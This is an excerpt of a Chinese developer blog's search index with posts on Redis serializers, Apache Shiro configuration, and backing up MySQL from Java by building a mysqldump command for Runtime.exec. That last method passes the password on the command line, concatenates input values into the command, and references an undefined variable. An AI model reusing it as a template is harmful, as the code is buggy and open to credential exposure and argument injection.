注入两个bean:RedisTemplate、StringRedisTemplate,</p><ol><li>两者的关系是StringRedisTemplate继承RedisTemplate。</li><li>RedisTemplate是一个泛型类，而StringRedisTemplate则不是。</li><li>StringRedisTemplate只能对key=String，value=String的键值对进行操作，RedisTemplate可以对任何类型的key-value键值对 操作。</li><li>他们各自序列化的方式不同，但最终都是得到了一个字节数组，殊途同归，StringRedisTemplate使用的是StringRedisSerializer类；RedisTemplate使用的是JdkSerializationRedisSerializer类。反序列化，则是一个得到String，一个得到Object。</li></ol><p>RedisTemplate在操作数据的时候，存入数据会将数据先序列化成字节数组然后在存入Redis数据库(默认JdkSerializationRedisSerializer:这个序列化方法就是Jdk提供的了,首先要求我们要被序列化的类继承自Serializeable接口，然后通过Jdk对象序列化的方法保存)，这个时候打开Redis查看的时候，你会看到你的数据不是以可读的形式，展现的，而是以字节数组显示，<br><img src="/img/Redis/Redis.png" alt="序列化不可读"><br>（注：这个序列化保存的对象，即使是个String类型的，在redis控制台，也是看不出来的，因为它保存了一些对象的类型什么的额外信息）</p><h2 id="Redis最近应用"><a href="#Redis最近应用" class="headerlink" title="Redis最近应用"></a>Redis最近应用</h2><p>个人开发小型JavaWeb程序利用redis存储token,记录获取验证的电话号码今日申请了几次，通过JWT将对象信息转化为String。<br>改造StringRedisTemplate、自定义RedisTemplate的实现类，使得Object对象转化为json使key-vlue再次转化为String-String进行序列化存储。<br>StringRedisSerializer源码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.springframework.data.redis.serializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.charset.Charset;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets; <span class="keyword">import</span> org.springframework.lang.Nullable; <span class="keyword">import</span> org.springframework.util.Assert;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StringRedisSerializer</span> <span class="keyword">implements</span> <span class="title">RedisSerializer</span>&lt;<span class="title">String</span>&gt; </span>&#123; <span class="keyword">private</span> <span class="keyword">final</span> Charset charset;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StringRedisSerializer US_ASCII; <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StringRedisSerializer ISO_8859_1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> StringRedisSerializer UTF_8;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">StringRedisSerializer</span><span class="params">()</span> </span>&#123; <span class="keyword">this</span>(StandardCharsets.UTF_8);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">StringRedisSerializer</span><span class="params">(Charset charset)</span> </span>&#123; Assert.notNull(charset, <span class="string">"Charset must not be null!"</span>); <span class="keyword">this</span>.charset = charset;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">deserialize</span><span class="params">(@Nullable <span class="keyword">byte</span>[] bytes)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> bytes == <span class="keyword">null</span> ? <span class="keyword">null</span> : <span class="keyword">new</span> String(bytes, <span class="keyword">this</span>.charset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] serialize(<span class="meta">@Nullable</span> String string) &#123;</span><br><span class="line"><span class="keyword">return</span> string == <span class="keyword">null</span> ? <span class="keyword">null</span> : string.getBytes(<span class="keyword">this</span>.charset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">US_ASCII = <span class="keyword">new</span> StringRedisSerializer(StandardCharsets.US_ASCII); ISO_8859_1 = <span class="keyword">new</span> StringRedisSerializer(StandardCharsets.ISO_8859_1); UTF_8 = <span class="keyword">new</span> StringRedisSerializer(StandardCharsets.UTF_8);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>自定义序列化方式使得可以接收Object对象：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.serializer.RedisSerializer; <span class="keyword">import</span> org.springframework.util.Assert;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.Charset;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*<span class="doctag">@ClassName</span>: MyStringRedisSerializer</span></span><br><span class="line"><span class="comment">*<span class="doctag">TODO:</span>类文件简单描述</span></span><br><span class="line"><span class="comment">*<span class="doctag">@Version</span>: 0.0.1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyStringRedisSerializer</span> <span class="keyword">implements</span> <span class="title">RedisSerializer</span>&lt;<span class="title">Object</span>&gt; </span>&#123; </span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Charset charset;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">MyStringRedisSerializer</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="keyword">this</span>(StandardCharsets.UTF_8);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">MyStringRedisSerializer</span><span class="params">(Charset charset)</span> </span>&#123; </span><br><span class="line">Assert.notNull(charset, <span class="string">"Charset must not be null!"</span>);</span><br><span class="line"> <span class="keyword">this</span>.charset = charset;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">deserialize</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> (bytes == <span class="keyword">null</span> ? <span class="keyword">null</span> : <span class="keyword">new</span> String(bytes, charset));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改部分</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] serialize(Object object) &#123; </span><br><span class="line"><span class="keyword">if</span> (object == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(object <span class="keyword">instanceof</span> String)&#123;</span><br><span class="line"><span class="keyword">return</span> object.toString().getBytes(charset);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">String string = JSON.toJSONString(object);</span><br><span class="line"><span class="keyword">return</span> string.getBytes(charset);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiro基础认识</title>
      <link href="/2020/09/05/shiro%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%86/"/>
      <url>/2020/09/05/shiro%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h2 id="shiro-简介"><a href="#shiro-简介" class="headerlink" title="shiro 简介"></a>shiro 简介</h2><p>shiro是apache的一个开源框架，而且呢是一个权限管理的框架，用于实现用户认证、用户授权。spring 中也有一个权限框架 spring security (原名Acegi)，它和 spring 依赖过于紧密，没有 shiro 使用简单。shiro 不依赖于 spring，shiro 不仅可以实现 web应用的权限管理，还可以实现c/s系统，分布式系统权限管理，shiro属于轻量框架，越来越多企业项目开始使用shiro。使用shiro实现系统的权限 管理，有效提高开发效率，从而降低开发成本。</p><h2 id="shiro-基本功能点"><a href="#shiro-基本功能点" class="headerlink" title="shiro 基本功能点"></a>shiro 基本功能点</h2><p><img src="/img/shiro/shiro1.png" alt="shiro结构图"><br>subject：主体，可以是用户也可以是程序，主体要访问系统，系统需要对主体进行认证、授权。security Manager：安全管理器，主体进行认证和授权都是通过securityManager进行。authenticator：认证器，主体进行认证最终通过authenticator进行的。               authorizer：授权器，主体进行授权最终通过authorizer进行的。<br>sessionManager：web应用中一般是用web容器对session进行管理，shiro也提供一套session管理的方式。SessionDao： 通过SessionDao管理session数据，针对个性化的session数据存储需要使用sessionDao。<br>cache Manager：缓存管理器，主要对session和授权数据进行缓存，比如将授权数据通过cacheManager进行缓存管理，和ehcache整合对缓存数据进行管理。      Cryptography：加密，保护数据的安全性，如密码加密存储到数据库，而不是明文存储。                                realm：域，领域，相当于数据源，通过realm存取认证、授权相关数据。</p><h2 id="认证流程"><a href="#认证流程" class="headerlink" title="认证流程"></a>认证流程</h2><p><img src="/img/shiro/shiro2.png" alt="shiro认证流程图"></p><ol><li>构建SecurityManager环境</li><li>主体提交认证</li><li>SecurityManager 处理</li><li>流转到 Authenticator 执行认证通过 Realm 获取相关的用户信息（获取验证数据进行验证）</li></ol><h2 id="授权流程"><a href="#授权流程" class="headerlink" title="授权流程"></a>授权流程</h2><p><img src="/img/shiro/shiro2.png" alt="shiro授权流程图"></p><ol><li>创建构建SecurityManager环境</li><li>主体提交授权认证</li><li>SecurityManager 处理</li><li>流转到 Authorizor 授权器执行授权认证</li><li>通过 Realm 从数据库或配置文件获取角色权限数据返回给授权器，进行授权。</li></ol><h2 id="shiro使用流程"><a href="#shiro使用流程" class="headerlink" title="shiro使用流程"></a>shiro使用流程</h2><p>注：适用于基于redis缓存的token验证，redis存储用户角色与权限，获取用户信息（包含角色、权限、登录过期时间、主键id等等）</p><h3 id="自定义配置安全域"><a href="#自定义配置安全域" class="headerlink" title="自定义配置安全域"></a>自定义配置安全域</h3><ol><li>extends AuthorizingRealm </li><li>验证用户名/密码/验证 token 是否有效 </li><li>从数据库获取用户的角色</li><li>根据角色获取用户权限</li></ol><h3 id="shiro核心配置——config"><a href="#shiro核心配置——config" class="headerlink" title="shiro核心配置——config"></a>shiro核心配置——config</h3><ol><li>读reids缓存</li><li>自定义域</li><li>构建 SecurityManager环境</li><li>配置shiro过滤器，配置拦截哪些请求</li><li>开启shiro aop注解支持<br>实例代码：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ShiroConfig</span> </span>&#123;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*自定义密码 校验</span></span><br><span class="line"><span class="comment">*<span class="doctag">@return</span>com.yingxue.lesson.shiro.CustomHashedCredentialsMatcher</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> CustomHashedCredentialsMatcher <span class="title">customHashedCredentialsMatcher</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="keyword">new</span> CustomHashedCredentialsMatcher();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*自定义域</span></span><br><span class="line"><span class="comment">*<span class="doctag">@return</span>com.yingxue.lesson.shiro.CustomRealm</span></span><br><span class="line"><span class="comment">*<span class="doctag">@throws</span></span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> CustomRealm <span class="title">customRealm</span><span class="params">()</span></span>&#123;</span><br><span class="line">CustomRealm customRealm=<span class="keyword">new</span> CustomRealm(); </span><br><span class="line">customRealm.setCredentialsMatcher(customHashedCredentialsMatcher()); </span><br><span class="line"><span class="keyword">return</span> customRealm;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*安全管理</span></span><br><span class="line"><span class="comment">*<span class="doctag">@return</span>org.apache.shiro.mgt.SecurityManager</span></span><br><span class="line"><span class="comment">*<span class="doctag">@throws</span></span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> SecurityManager <span class="title">securityManager</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//构建 SecurityManager环境</span></span><br><span class="line">DefaultWebSecurityManager securityManager=<span class="keyword">new</span> DefaultWebSecurityManager();</span><br><span class="line"><span class="comment">//自定义 Realm</span></span><br><span class="line">securityManager.setRealm(customRealm()); </span><br><span class="line"><span class="keyword">return</span> securityManager;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*shiro过滤器，配置拦截哪些请求</span></span><br><span class="line"><span class="comment">*<span class="doctag">@param</span> securityManager</span></span><br><span class="line"><span class="comment">*<span class="doctag">@return</span>org.apache.shiro.spring.web.ShiroFilterFactoryBean</span></span><br><span class="line"><span class="comment">*<span class="doctag">@throws</span></span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ShiroFilterFactoryBean <span class="title">shiroFilterFactoryBean</span><span class="params">(SecurityManager securityManager)</span></span>&#123; </span><br><span class="line">ShiroFilterFactoryBean shiroFilterFactoryBean = <span class="keyword">new</span> ShiroFilterFactoryBean(); shiroFilterFactoryBean.setSecurityManager(securityManager);</span><br><span class="line"><span class="comment">//自定义拦截器限制并发人数,参考博客</span></span><br><span class="line">LinkedHashMap&lt;String, Filter&gt; filtersMap = <span class="keyword">new</span> LinkedHashMap&lt;&gt;();</span><br><span class="line"><span class="comment">//用来校验token</span></span><br><span class="line">filtersMap.put(<span class="string">"token"</span>, <span class="keyword">new</span> CustomAccessControlFilter()); shiroFilterFactoryBean.setFilters(filtersMap);</span><br><span class="line">Map&lt;String, String&gt; filterChainDefinitionMap = <span class="keyword">new</span> LinkedHashMap&lt;&gt;(); filterChainDefinitionMap.put(<span class="string">"/api/user/login"</span>, <span class="string">"anon"</span>);</span><br><span class="line"><span class="comment">//放开swagger-ui地址</span></span><br><span class="line">filterChainDefinitionMap.put(<span class="string">"/swagger/**"</span>, <span class="string">"anon"</span>);</span><br><span class="line">filterChainDefinitionMap.put(<span class="string">"/v2/api-docs"</span>, <span class="string">"anon"</span>); </span><br><span class="line">filterChainDefinitionMap.put(<span class="string">"/swagger-ui.html"</span>, <span class="string">"anon"</span>); </span><br><span class="line">filterChainDefinitionMap.put(<span class="string">"/swagger-resources/**"</span>, <span class="string">"anon"</span>); </span><br><span class="line">filterChainDefinitionMap.put(<span class="string">"/webjars/**"</span>, <span class="string">"anon"</span>); </span><br><span class="line">filterChainDefinitionMap.put(<span class="string">"/favicon.ico"</span>, <span class="string">"anon"</span>); </span><br><span class="line">filterChainDefinitionMap.put(<span class="string">"/captcha.jpg"</span>, <span class="string">"anon"</span>); </span><br><span class="line">filterChainDefinitionMap.put(<span class="string">"/csrf"</span>,<span class="string">"anon"</span>); </span><br><span class="line">filterChainDefinitionMap.put(<span class="string">"/**"</span>,<span class="string">"token,authc"</span>); </span><br><span class="line">shiroFilterFactoryBean.setFilterChainDefinitionMap(filterChainDefinitionMap); </span><br><span class="line"><span class="keyword">return</span> shiroFilterFactoryBean;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*开启shiro aop注解支持.</span></span><br><span class="line"><span class="comment">*使用代理方式;所以需要开启代码支持;</span></span><br><span class="line"><span class="comment">*<span class="doctag">@param</span> securityManager</span></span><br><span class="line"><span class="comment">*<span class="doctag">@return</span>org.apache.shiro.spring.security.interceptor.AuthorizationAttributeSourceAdvisor</span></span><br><span class="line"><span class="comment">*<span class="doctag">@throws</span></span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> AuthorizationAttributeSourceAdvisor <span class="title">authorizationAttributeSourceAdvisor</span><span class="params">(SecurityManager securityManager)</span> </span>&#123;</span><br><span class="line">AuthorizationAttributeSourceAdvisor authorizationAttributeSourceAdvisor = <span class="keyword">new</span> AuthorizationAttributeSourceAdvisor();</span><br><span class="line">authorizationAttributeSourceAdvisor.setSecurityManager(securityManager);</span><br><span class="line"><span class="keyword">return</span> authorizationAttributeSourceAdvisor;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Bean</span> </span><br><span class="line"><span class="meta">@ConditionalOnMissingBean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> DefaultAdvisorAutoProxyCreator <span class="title">defaultAdvisorAutoProxyCreator</span><span class="params">()</span> </span>&#123; </span><br><span class="line">DefaultAdvisorAutoProxyCreator defaultAdvisorAutoProxyCreator = newDefaultAdvisorAutoProxyCreator(); </span><br><span class="line">defaultAdvisorAutoProxyCreator.setProxyTargetClass(<span class="keyword">true</span>); </span><br><span class="line"><span class="keyword">return</span> defaultAdvisorAutoProxyCreator;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="shiro注解控制请求调用与前端权限控制可见性"><a href="#shiro注解控制请求调用与前端权限控制可见性" class="headerlink" title="shiro注解控制请求调用与前端权限控制可见性"></a>shiro注解控制请求调用与前端权限控制可见性</h3><p>后端controller层shiro注解使用：<br>实例代码：<br>拥有sys:user:list权限的角色才能调用这个请求<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span>(<span class="string">"/users"</span>)</span><br><span class="line"><span class="meta">@ApiOperation</span>(value = <span class="string">"分页查询用户接口"</span>)</span><br><span class="line"><span class="meta">@RequiresPermissions</span>(<span class="string">"sys:user:list"</span>)</span><br><span class="line"><span class="keyword">public</span> DataResult&lt;PageVO&lt;SysUser&gt;&gt; pageInfo(<span class="meta">@RequestBody</span> UserPageReqVO vo)&#123;</span><br><span class="line">    DataResult result=DataResult.success();</span><br><span class="line">    result.setData(userService.pageInfo(vo));</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>前端控制不同角色按钮元素可见性：<br>拥有sys:log:delete权限的角色才能看到使用这个按钮<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/html"</span> id=<span class="string">"toolbar"</span>&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"layui-btn-group"</span>&gt;</span><br><span class="line">        &lt;button type=<span class="string">"button"</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">"layui-btn"</span> lay-event=<span class="string">"batchDelLog"</span> shiro:hasPermission=<span class="string">"sys:log:delete"</span>&gt;</span><br><span class="line">            &lt;i class="layui-icon"&gt;&amp;#xe608;&lt;/i&gt; 批量删除</span><br><span class="line">        &lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> shiro </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java后端使用mysqldump备份数据库</title>
      <link href="/2020/08/24/java%E5%90%8E%E7%AB%AF%E4%BD%BF%E7%94%A8mysqldump%E5%A4%87%E4%BB%BD%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2020/08/24/java%E5%90%8E%E7%AB%AF%E4%BD%BF%E7%94%A8mysqldump%E5%A4%87%E4%BB%BD%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>在接老师开发商业性质的项目的时候，接受了一个前端操作向后端发送请求进行数据库备份文件生成于下载的任务，花费了自己蛮多心血特此记录一下。</p><h2 id="任务要求"><a href="#任务要求" class="headerlink" title="任务要求"></a>任务要求</h2><p>在指定页面以form表单（采用layui框架）显示出相关企业单位的备份信息(备份时间、备份文件名，文件名显示备份完成时间、备份相关内容、备份次数)，同时提供操作栏进行备份下载于删除操作<br><img src="/img/sql/backup.PNG" alt=""></p><h2 id="核心完成方法"><a href="#核心完成方法" class="headerlink" title="核心完成方法"></a>核心完成方法</h2><p>java拼接mysqldump运行指令，并执行，由于数据库冗余较少涉及多次命令拼接与执行耗费较多时间（mysqldump指令在我的查找各种博客和官方文档暂未看到像sql查询语句的in、not in、or关键词字段进行条件判断只得在—where上下功夫）<br>注意：mysqldump数据库备份可导致锁表，对一个正在运行的数据库进行备份请慎重！！ 如果一定要 在服务运行期间备份，请添加 —skip-opt<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump --skip-opt -h hostip -u root --password=password DatabaseName &gt;xxxx.sql</span><br></pre></td></tr></table></figure></p><p>废话少说下面是示例代码：<br>path： 备份文件的生成路径地址<br>dateString:转换为yyyyMMddHHmm格式的date字符串<br>ent_id： 主键id(String)<br>userTableName: 所有需要备份的表名字符串(“,”分隔的字符串)<br>user： 备份相关数据库的用户名<br>password： 备份相关数据库的密码<br>hostIP： 数据库IP地址<br>exportDatabaseName： 备份的数据库<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">public void exportSql(String path, String dateString, String ent_id,String userTableName,String user, String password, String hostIP, String exportDatabaseName) &#123;</span><br><span class="line">       String folderName_1 = <span class="string">"ZYK_"</span> + ent_id + <span class="string">"_BackupENT_"</span> + dateString + <span class="string">".sql"</span>;</span><br><span class="line">       File saveFile = new File(path);</span><br><span class="line">       // 如果目录不存在</span><br><span class="line">       <span class="keyword">if</span> (!saveFile.exists()) &#123;</span><br><span class="line">           // 创建文件夹</span><br><span class="line">           saveFile.mkdirs();</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span>(!path.endsWith(File.separator))&#123;</span><br><span class="line">           path = path + File.separator;</span><br><span class="line">       &#125;</span><br><span class="line">       //备份有ent_id字段列的表</span><br><span class="line">       PrintWriter printWriter = null;</span><br><span class="line">       BufferedReader bufferedReader = null;</span><br><span class="line">       try &#123;</span><br><span class="line">           printWriter = new PrintWriter(new OutputStreamWriter(new FileOutputStream(path + folderName_1), <span class="string">"utf8"</span>));</span><br><span class="line">           Process process = Runtime.getRuntime().<span class="built_in">exec</span>(<span class="string">" mysqldump -h"</span> + hostIP + <span class="string">" -u"</span> + user + <span class="string">" -p"</span> + password + <span class="string">" --set-charset=UTF8 "</span> + exportDatabaseName +<span class="string">" --tables "</span>+entTableName+<span class="string">" "</span>+<span class="string">"--where=\"ent_id='"</span>+ ent_id + <span class="string">"'\""</span>);</span><br><span class="line">           InputStreamReader inputStreamReader = new InputStreamReader(process.getInputStream(), <span class="string">"utf8"</span>);</span><br><span class="line">           bufferedReader = new BufferedReader(inputStreamReader);</span><br><span class="line">           String line;</span><br><span class="line">           <span class="keyword">while</span> ((line = bufferedReader.readLine()) != null) &#123;</span><br><span class="line">               printWriter.println(line);</span><br><span class="line">           &#125;</span><br><span class="line">           printWriter.flush();</span><br><span class="line">           <span class="keyword">if</span> (process.waitFor() != 0) &#123;</span><br><span class="line">               throw new CustomException(<span class="string">"线程未正常中止"</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; catch (Exception e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">           throw new CustomException(<span class="string">"备份sql操作失败"</span>);</span><br><span class="line">       &#125; finally &#123;</span><br><span class="line">           try &#123;</span><br><span class="line">               <span class="keyword">if</span> (bufferedReader != null) &#123;</span><br><span class="line">                   bufferedReader.close();</span><br><span class="line">               &#125;</span><br><span class="line">               <span class="keyword">if</span> (printWriter != null) &#123;</span><br><span class="line">                   printWriter.close();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; catch (IOException e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> mysqldump </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysqldump </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
